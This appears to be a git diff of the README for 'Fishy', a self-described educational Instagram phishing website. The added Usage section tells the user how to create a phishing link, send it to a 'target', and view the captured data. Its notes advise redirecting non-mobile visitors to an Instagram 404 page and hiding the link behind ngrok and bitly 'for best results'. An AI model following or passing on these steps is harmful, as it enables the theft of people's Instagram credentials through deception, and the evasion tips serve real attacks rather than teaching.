@@ -1,5 +1,5 @@
 # Fishy
-Hungwy? Fishy someone...
+Hungwy? **Fishy** someone...
 
 # Fishy - Instagram Phising Website
 
@@ -24,43 +24,62 @@ Fishy is a simple educational phising website. This project was created for educ
 
 To get started with Fishy, follow these steps:
 
-1. Clone the repository:
+### 1. Clone the Repository:
 
-   ```
+   ```bash
    git clone https://github.com/sh3ldr0id/Fishy.git
    ```
 
-2. Navigate to the project directory:
+### 2. Navigate to the Project Directory:
 
-   ```
-   cd Fishy
+   ```bash
+   cd Fishy/
    ```
 
-3. Create and activate virtual env.
-   ```
+### 3. Create and Activate Virtual Env:
+
+   ```bash
    python -m venv venv
    ```
-   
+
+   * On Windows
+   ```bash
+   venv\Scripts\activate
    ```
-   cd venv/Scripts
-   activate.bat
-   ```
-   OR
-   ```
+   * On macOS and Linux
+   ```bash
    source venv/bin/activate
    ```
-   
-4. Install requirements.txt.
-   ```
+
+### 4. Install Dependancies:
+
+   ```bash
    pip install -r requirements.txt
    ```
 
-5. Run the server.
-   ```
+### 5. Run the server:
+
+   ```bash
    python app.py
    ```
    
 ## Usage
+
+   ### Create Fishy Link:
+   Go to http://localhost:5000/password/create and follow the steps there to create a link. (Replace password with your password. Default password is "password")
+
+   ### Send Link to Target:
+   Send http://localhost:5000/backend to your target. (Replace backend with the backend provided at the create page.)
+
+   ### View and Manage your Link:
+   Go to http://localhost:5000/password/backend/view to view and update your data.
+
+## Note
+   - *Fishy* automatically redirects the targets Instagram 404 if the target's device is not a mobile device or if a request is send to a random url.
+   - Update "config.json" according to your needs.
+   - By default the server runs at **http://127.0.0.1:4156** with "password" as it's password.
+   - Use *Fishy* along with a tunneling service like *ngrok* and a link shortening service like *bitly* for best results.
+
 
 ## Contact
 
